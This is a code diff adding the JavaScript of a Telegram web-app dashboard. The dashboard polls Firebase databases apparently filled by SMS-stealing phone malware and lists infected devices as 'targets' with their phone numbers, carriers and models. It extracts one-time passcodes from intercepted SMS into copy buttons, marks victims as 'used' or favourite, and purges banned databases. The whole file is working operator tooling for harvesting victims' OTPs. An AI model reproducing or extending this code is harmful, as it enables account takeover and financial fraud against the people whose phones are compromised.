+function forceTargetsScreen() { if(current !== 1) { openOption('Targets', 1, dockBtns[1]); } }
+
+let startX = 0; let isDragging = false; let swipeWrap = document.querySelector(".swipeWrap");
+swipeWrap.addEventListener("pointerdown", e => {
+  if(isModalOpen || e.target.closest('.tilt-card') || e.target.closest('input') || e.target.closest('button') || e.target.closest('.filter-chip') || e.target.closest('.status-card') || e.target.closest('.target-list') || e.target.closest('.otp-pill')) return; 
+  startX = e.clientX; isDragging = true; swipeWrap.setPointerCapture(e.pointerId); screens.forEach(s => s.style.transition = "none");
+});
+swipeWrap.addEventListener("pointermove", e => {
+  if (!isDragging) return; let currentX = e.clientX; let deltaX = currentX - startX;
+  screens.forEach((s, i) => {
+    if (i === current) s.style.transform = `translateX(${deltaX}px)`; else if (i === current - 1) s.style.transform = `translateX(calc(-100% + ${deltaX}px))`; else if (i === current + 1) s.style.transform = `translateX(calc(100% + ${deltaX}px))`;
+  });
+});
+function handleSwipeEnd(e) {
+  if (!isDragging) return; isDragging = false; let endX = e.clientX; let deltaX = endX - startX;
+  screens.forEach(s => { s.style.transition = "0.4s cubic-bezier(.25,1,.25,1)"; s.style.transform = ""; });
+  if (deltaX < -60 && current < screens.length - 1) { current++; try { if (tg) tg.HapticFeedback.impactOccurred('light'); } catch(e) {} } else if (deltaX > 60 && current > 0) { current--; try { if (tg) tg.HapticFeedback.impactOccurred('light'); } catch(e) {} }
+  render(); 
+}
+swipeWrap.addEventListener("pointerup", handleSwipeEnd); swipeWrap.addEventListener("pointercancel", handleSwipeEnd);
+
+function render() {
+  screens.forEach((s, i) => { s.className = "screen"; if (i < current) s.classList.add("out"); else if (i === current) s.classList.add("active"); else s.classList.add("next"); });
+  dockBtns.forEach(b => b.classList.remove("active-btn")); if (dockBtns[current]) dockBtns[current].classList.add("active-btn");
+}
+
+/* ================= EXACT V23 STEALTH DOCK ================= */
+const navDock = document.querySelector('.nav-container'); let isStealthOff = false; let lastTapTime = 0;
+document.addEventListener('pointerup', (e) => {
+  if (isModalOpen || e.target.closest('.nav-container') || e.target.closest('input') || e.target.closest('button') || e.target.closest('.filter-chip') || e.target.closest('.status-card') || e.target.closest('.target-list') || e.target.closest('.otp-pill')) return;
+  let currentTime = new Date().getTime(); let tapLength = currentTime - lastTapTime;
+  if (tapLength < 300 && tapLength > 0) toggleStealth(); lastTapTime = currentTime;
+});
+function toggleStealth() { isStealthOff = !isStealthOff; if(isStealthOff) { navDock.classList.add('stealth-off'); } else { navDock.classList.remove('stealth-off'); } }
+
+document.addEventListener("click", (e) => { if (!e.target.closest('button') && !e.target.closest('input') && !e.target.closest('.filter-chip') && !e.target.closest('.otp-pill')) { createNanoSpark(e.clientX, e.clientY); } });
+function createNanoSpark(x, y) { let s = document.createElement("div"); s.className = "nano-spark"; s.style.left = x + "px"; s.style.top = y + "px"; document.body.appendChild(s); setTimeout(() => s.remove(), 250); }
+
+/* ================= MANUAL BULK ADD ================= */
+function addDatabase() {
+    const input = document.getElementById("db-input-url"); 
+    let rawStr = input.value.trim();
+    if(!rawStr) { alert("Bhai, pehle fields me nodes paste kar!"); return; }
+
+    let addedCount = processRawUrls(rawStr);
+
+    if(addedCount > 0) {
+        input.value = ""; 
+        fetchAndRenderTargets(false); // Immediate Fetch
+    } else {
+        alert("Koi valid/nayi Firebase URL nahi mili! Sirf wahi paste kar jisme '.firebaseio.com' ho.");
+    }
+}
+
+function isOnline(val) { return (typeof val === 'object' && val !== null) ? (String(val.status || '').toLowerCase() === 'online' || String(val.status || '').toLowerCase() === 'true') : false; }
+function extractUniversalModel(valDict) { if(typeof valDict !== 'object' || valDict === null) return "Unknown"; for(let key of ['d_name', 'modelName', 'Name', 'model']) { if(valDict[key]) return String(valDict[key]); } if(valDict.deviceInfo && valDict.deviceInfo.model) return String(valDict.deviceInfo.model); return "Unknown"; }
+function extractPhoneAndCarrier(data1, data2 = null) {
+    let pairs = []; const invalid = ["no data", "not available", "no sim found", "no service", "unknown", "", "1", "2"];
+    function cleanNum(n) { if (n && !invalid.includes(String(n).toLowerCase().trim())) { let cln = String(n).split("-")[0].replace(/\D/g, '').trim(); return cln.length >= 10 ? cln.slice(-10) : null; } return null; }
+    function addIfValid(raw) { if (raw && !invalid.includes(String(raw).toLowerCase().trim())) { let parts = String(raw).split(" - "); let num = cleanNum(parts[0]); let car = parts.length > 1 ? parts[1].trim() : "Unknown"; if (num && !pairs.some(p => p.num === num)) { pairs.push({num: num, car: car}); } } }
+    [data1, data2].forEach(d => {
+        if (typeof d === 'object' && d !== null) {
+            ['phoneNumber', 'mobNo', 'numberSim1', 'numberSim2', 'sim1', 'sim2'].forEach(k => { addIfValid(d[k]); });
+            if (Array.isArray(d.sims)) { d.sims.forEach(sim => { if (typeof sim === 'object' && sim !== null) addIfValid(sim.phoneNumber); }); }
+            if (typeof d.simInfo === 'object' && d.simInfo !== null) { ['sim1', 'sim2'].forEach(k => { let simVal = d.simInfo[k]; if (typeof simVal === 'object' && simVal !== null) { let num = cleanNum(simVal.number); let car = simVal.carrier || "Unknown"; if (num && !pairs.some(p => p.num === num)) pairs.push({num: num, car: car}); } else if (simVal) { addIfValid(simVal); } }); }
+        }
+    });
+    let p1 = pairs.length > 0 ? pairs[0].num : "Unknown"; let c1 = pairs.length > 0 ? pairs[0].car : "Unknown"; let p2 = pairs.length > 1 ? pairs[1].num : "Unknown"; let c2 = pairs.length > 1 ? pairs[1].car : "Unknown";
+    return { p1, p2, c1, c2 };
+}
+
+function parseDatabaseSmartly(dbIndex, dbDump) {
+    let targets = []; if (typeof dbDump !== 'object' || dbDump === null) return targets;
+    function buildTarget(did, infoObj, simObj, smsDict) { let simData = extractPhoneAndCarrier(infoObj, simObj); let model = extractUniversalModel(infoObj); return { dbIndex, did, p1: simData.p1, p2: simData.p2, c1: simData.c1, c2: simData.c2, smsDict: smsDict || {}, model: model }; }
+    if (dbDump.user_data) { Object.entries(dbDump.user_data).forEach(([did, val]) => { if (isOnline(val)) targets.push(buildTarget(did, val, null, (dbDump.user_sms || {})[did])); }); return targets; }
+    if (dbDump.clients && dbDump.messages) { Object.entries(dbDump.clients).forEach(([did, val]) => { if (isOnline(val)) targets.push(buildTarget(did, val, null, dbDump.messages[did])); }); return targets; }
+    for (const [key, val] of Object.entries(dbDump)) { if (val && typeof val === 'object' && val.All_User) { let info = val.All_User.Info || {}; let simInfo = val.All_User.SimINFO || {}; let smsAll = val.All_User.Sms || {}; Object.entries(info).forEach(([didKey, infoVal]) => { if (isOnline(infoVal)) { let actualDid = infoVal.did || didKey; targets.push(buildTarget(actualDid, infoVal, simInfo[actualDid], smsAll[actualDid])); } }); return targets; } }
+    let root = dbDump.admin ? dbDump.admin : dbDump; for (const [panel, pData] of Object.entries(root)) { if (pData && typeof pData === 'object' && pData.users) { Object.entries(pData.users).forEach(([did, uData]) => { if (typeof uData === 'object' && uData !== null && isOnline(uData) && uData.receivedSms) { targets.push(buildTarget(did, uData, null, uData.receivedSms)); } }); } } return targets;
+}
+
+function updateDashboardCounts() {
+    document.getElementById('dash-db-count').innerText = activeDatabases.length;
+    document.getElementById('dash-target-count').innerText = globalTargetsCache.length;
+    let actualFavs = globalTargetsCache.filter(t => favTargets.includes(t.did)).length;
+    document.getElementById('dash-fav-count').innerText = actualFavs;
+}
+
+async function fetchAndRenderTargets(silent = false) {
+    const listContainer = document.getElementById("targetList");
+    if(activeDatabases.length === 0) return;
+    if(!silent) listContainer.innerHTML = `<div class="empty-state">Syncing data streams... ⏳</div>`;
+    
+    let allTargets = []; let fetchErrors = 0; let deadNodes = [];
+    const syncDot = document.getElementById('sync-dot'); if(silent && syncDot) { syncDot.style.display = 'inline'; setTimeout(()=> syncDot.style.display = 'none', 1000); }
+    
+    for (let i = 0; i < activeDatabases.length; i++) { 
+        try { 
+            let res = await fetch(activeDatabases[i]); 
+            if (res.ok) { 
+                let data = await res.json(); 
+                allTargets = allTargets.concat(parseDatabaseSmartly(`Node-${i+1}`, data)); 
+            } else { 
+                fetchErrors++;
+                // ⚡ DEAD NODE PURGER ⚡ (Removes banned/locked Firebases automatically)
+                if (res.status === 423 || res.status === 403 || res.status === 401 || res.status === 404) {
+                    deadNodes.push(activeDatabases[i]);
+                }
+            } 
+        } catch (e) { 
+            fetchErrors++; 
+        } 
+    }
+
+    // Clean up dead nodes from array so we don't waste time on them again
+    if(deadNodes.length > 0) {
+        activeDatabases = activeDatabases.filter(db => !deadNodes.includes(db));
+    }
+    
+    globalTargetsCache = allTargets; globalTargetsCache.forEach((t, i) => t.serial = i + 1);
+    updateDashboardCounts();
+    
+    if(!silent) { 
+        if(activeDatabases.length === 0) {
+            listContainer.innerHTML = `<div class="empty-state" style="color:#ff3366;">❌ All scanned databases were dead (423/403) and have been purged. Input fresh URLs.</div>`; 
+        } else if(fetchErrors > 0 && allTargets.length === 0) { 
+            listContainer.innerHTML = `<div class="empty-state" style="color:#ff3366;">❌ Error connecting to Firebase. Data empty.</div>`; 
+        } else { 
+            renderFilteredList(); 
+        } 
+    } else { 
+        renderFilteredList(true); 
+        if(isModalOpen && currentModalDid) { updateModalLive(currentModalDid); } 
+    }
+    
+    if(!livePollingActive) { livePollingActive = true; setInterval(() => { fetchAndRenderTargets(true); }, 7000); }
+}
+
+function setFilter(filterType, btnElement) {
+    try { if (tg && tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light'); } catch(e) {}
+    document.querySelectorAll('.filter-chip').forEach(el => el.classList.remove('active')); btnElement.classList.add('active');
+    currentFilter = filterType; renderFilteredList();
+}
+
+function renderFilteredList(silent = false) {
+    const listContainer = document.getElementById("targetList"); 
+    const searchQuery = (document.getElementById("target-search-input").value || "").toLowerCase().trim();
+
+    let displayTargets = globalTargetsCache.filter(t => {
+        let hasSms = Object.keys(t.smsDict).length > 0; let passFilter = true;
+        if(currentFilter === 'HOT') passFilter = hasSms; if(currentFilter === 'UNUSED') passFilter = !hasSms;
+        if(!passFilter) return false;
+        if(searchQuery) {
+            let targetStr = `target ${t.serial}`;
+            let matchPhone = (t.p1 && t.p1.toLowerCase().includes(searchQuery)) || (t.p2 && t.p2.toLowerCase().includes(searchQuery));
+            let matchTarget = targetStr.includes(searchQuery); let matchId = t.did.toLowerCase().includes(searchQuery);
+            return matchPhone || matchTarget || matchId;
+        }
+        return true; 
+    });
+
+    if (displayTargets.length === 0) { if(!silent) listContainer.innerHTML = `<div class="empty-state">No targets found.</div>`; return; }
+
+    let newHTML = '';
+    displayTargets.forEach((t) => {
+        let hasSms = Object.keys(t.smsDict).length > 0; let statusColor = hasSms ? '#a3e635' : '#7b6699'; let statusText = hasSms ? 'LIVE / PAYLOAD READY' : 'DORMANT';
+        let badgesHTML = ''; if(usedTargets.includes(t.did)) badgesHTML += `<span class="ext-badge bdg-used">USED</span>`; if(favTargets.includes(t.did)) badgesHTML += `<span class="ext-badge bdg-fav">⭐ FAV</span>`;
+        newHTML += `
+        <div class="status-card" style="margin-bottom: 15px; padding-top: 35px;" onclick="openTargetModal('${t.did}')">
+            <div class="target-serial">TARGET ${t.serial}</div>
+            <div class="ext-badges">${badgesHTML}</div>
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <h3 style="margin:0; font-size:12px;">ID: ${t.did.substring(0,12)}...</h3>
+                <span style="font-size:10px; font-weight:800; color: ${statusColor};">${statusText}</span>
+            </div>
+            <h2 style="margin: 8px 0; font-size: 18px;">📞 ${t.p1}</h2>
+            <p style="margin:0; font-size:11px;">Model: ${t.model} | Cluster: ${t.dbIndex}</p>
+        </div>`;
+    });
+    listContainer.innerHTML = newHTML;
+}
+
+/* ================= MODAL, COPY & SNIPER FILTER LOGIC ================= */
+
+function openTargetModal(did) { 
+    isModalOpen = true; currentModalDid = did; 
+    try { if (tg && tg.HapticFeedback) tg.HapticFeedback.impactOccurred('medium'); } catch(e) {} 
+    let bolt = document.getElementById('live-bolt'); if(bolt) bolt.classList.remove('flash'); 
+    updateModalLive(did); 
+    document.getElementById('targetModal').classList.add('open'); 
+}
+
+function copyNum(elementId, btn) {
+    if (window.event) window.event.stopPropagation();
+    let text = document.getElementById(elementId).innerText;
+    if(text && text !== "--" && text !== "Unknown") {
+        navigator.clipboard.writeText(text);
+        let oldHTML = btn.innerHTML;
+        btn.innerText = "✅"; btn.style.borderColor = "#a3e635"; btn.style.color = "#a3e635";
+        try { if (tg && tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success'); } catch(e) {}
+        setTimeout(() => { btn.innerHTML = oldHTML; btn.style.borderColor = "rgba(255,255,255,0.15)"; btn.style.color = "#fff"; }, 1500);
+    }
+}
+
+// ⚡ OTP EXTRACTOR HELPER FUNCTION ⚡
+function extractAndWrapOTP(text) {
+    if (!text) return "No Content";
+    let safeText = String(text).replace(/</g, "&lt;").replace(/>/g, "&gt;");
+    const otpRegex = /\b(\d{4,8})\b/g;
+    return safeText.replace(otpRegex, `<span class="otp-pill" onclick="copyOTP('$1', this, event)">$1</span>`);
+}
+
+// ⚡ GLOBAL COPY FUNCTION FOR OTP PILLS ⚡
+function copyOTP(text, btn, event) {
+    if (event) event.stopPropagation();
+    navigator.clipboard.writeText(text);
+    
+    let oldHTML = btn.innerHTML;
+    btn.innerText = "COPIED!";
+    btn.style.background = "#a3e635";
+    btn.style.color = "#05000a";
+    
+    try { if (tg && tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success'); } catch(e) {}
+    
+    setTimeout(() => { 
+        btn.innerHTML = oldHTML; 
+        btn.style.background = "rgba(163, 230, 53, 0.15)"; 
+        btn.style.color = "#a3e635"; 
+    }, 1000);
+}
+
+function applySmsFilter() {
+    activeSmsFilter = document.getElementById("sms-filter-input").value.trim().toLowerCase();
+    try { if (tg && tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light'); } catch(e) {}
+    if(currentModalDid) updateModalLive(currentModalDid);
+}
+
+function toggleUsed() { if(!currentModalDid) return; try { if (tg && tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light'); } catch(e) {} if(usedTargets.includes(currentModalDid)) { usedTargets = usedTargets.filter(id => id !== currentModalDid); } else { usedTargets.push(currentModalDid); } saveStorage(); updateModalLive(currentModalDid); renderFilteredList(true); }
+function toggleFav() { if(!currentModalDid) return; try { if (tg && tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light'); } catch(e) {} if(favTargets.includes(currentModalDid)) { favTargets = favTargets.filter(id => id !== currentModalDid); } else { favTargets.push(currentModalDid); } saveStorage(); updateDashboardCounts(); updateModalLive(currentModalDid); renderFilteredList(true); }
+function clearSms() { if(!currentModalDid) return; try { if (tg && tg.HapticFeedback) tg.HapticFeedback.impactOccurred('medium'); } catch(e) {} clearedTimes[currentModalDid] = Date.now(); saveStorage(); updateModalLive(currentModalDid); }
+
+function updateModalLive(did) {
+    let t = globalTargetsCache.find(x => x.did === did); if(!t) return;
+    let badgeContainer = document.getElementById('m-badges'); badgeContainer.innerHTML = ''; let btnUsed = document.getElementById('btn-used'); let btnFav = document.getElementById('btn-fav');
+    if(usedTargets.includes(did)) { badgeContainer.innerHTML += `<span class="ext-badge bdg-used">USED</span>`; btnUsed.classList.add('used-active'); btnUsed.innerText = "UNMARK USED"; } else { btnUsed.classList.remove('used-active'); btnUsed.innerText = "MARK USED"; }
+    if(favTargets.includes(did)) { badgeContainer.innerHTML += `<span class="ext-badge bdg-fav">⭐ FAV</span>`; btnFav.classList.add('fav-active'); btnFav.innerText = "REMOVE FAV"; } else { btnFav.classList.remove('fav-active'); btnFav.innerText = "⭐ FAV"; }
+
+    document.getElementById('m-sim1-num').innerText = t.p1; document.getElementById('m-sim1-car').innerText = t.c1;
+    let sim2Box = document.getElementById('m-sim2-box'); if(t.p2 !== "Unknown") { sim2Box.style.display = "flex"; document.getElementById('m-sim2-num').innerText = t.p2; document.getElementById('m-sim2-car').innerText = t.c2; } else { sim2Box.style.display = "none"; }
+    document.getElementById('m-model').innerText = t.model; document.getElementById('m-cluster').innerText = t.dbIndex;
+
+    let smsArr = []; let clearTime = clearedTimes[did] || 0; 
+    for(let key in t.smsDict) {
+        let msg = t.smsDict[key]; let rawTs = msg.timestamp || msg.date || msg.dateTime || msg.id || 0; let tsMs = String(rawTs).length <= 10 ? rawTs * 1000 : parseInt(rawTs);
+        let rawBodyText = msg.body || msg.msg || msg.message || "No Content";
+        let senderText = msg.sender || msg.ph || msg.address || "Unknown";
+        
+        if (activeSmsFilter && !String(rawBodyText).toLowerCase().includes(activeSmsFilter) && !senderText.toLowerCase().includes(activeSmsFilter)) { continue; }
+        
+        if (tsMs > clearTime) { 
+            let formattedBody = extractAndWrapOTP(rawBodyText);
+            smsArr.push({ body: formattedBody, sender: senderText, ts: tsMs }); 
+        }
+    }
+    
+    smsArr.sort((a,b) => b.ts - a.ts); 
+    let countLabel = activeSmsFilter ? `${smsArr.length} Filtered` : `${smsArr.length} Msgs`;
+    document.getElementById('m-sms-count').innerText = countLabel;
+    
+    let feedContainer = document.getElementById('m-sms-feed'); let currentMsgCount = feedContainer.children.length;
+
+    if (currentMsgCount > 0 && smsArr.length > currentMsgCount && feedContainer.innerHTML.indexOf("Awaiting packets") === -1) {
+        let bolt = document.getElementById('live-bolt');
+        if(bolt) { bolt.classList.add('flash'); setTimeout(() => { bolt.classList.remove('flash'); }, 1000); try { if (tg && tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success'); } catch(e){} }
+    }
+
+    if(smsArr.length === 0) { 
+        let emptyTxt = activeSmsFilter ? `No packets matching "${activeSmsFilter}"...` : `Awaiting packets...`;
+        feedContainer.innerHTML = `<div style="text-align:center; color:#7b6699; padding-top:20px;">${emptyTxt}</div>`; 
+    } else {
+        let feedHTML = '';
+        smsArr.forEach(msg => { let d = new Date(msg.ts); let timeStr = d.toLocaleString(); if(timeStr === "Invalid Date") timeStr = "Unknown Time"; feedHTML += `<div class="msg-bubble"><div class="msg-sender">${msg.sender} <span class="msg-time">${timeStr}</span></div><div class="msg-text">${msg.body}</div></div>`; });
+        feedContainer.innerHTML = feedHTML;
+    }
+}
+
+function closeTargetModal() { 
+    isModalOpen = false; currentModalDid = null; 
+    let bolt = document.getElementById('live-bolt'); if(bolt) bolt.classList.remove('flash'); 
+    document.getElementById("sms-filter-input").value = ""; activeSmsFilter = "";
+    document.getElementById('targetModal').classList.remove('open'); 
+}
+updateDashboardCounts();
+</script>
+
+</body>
+</html>
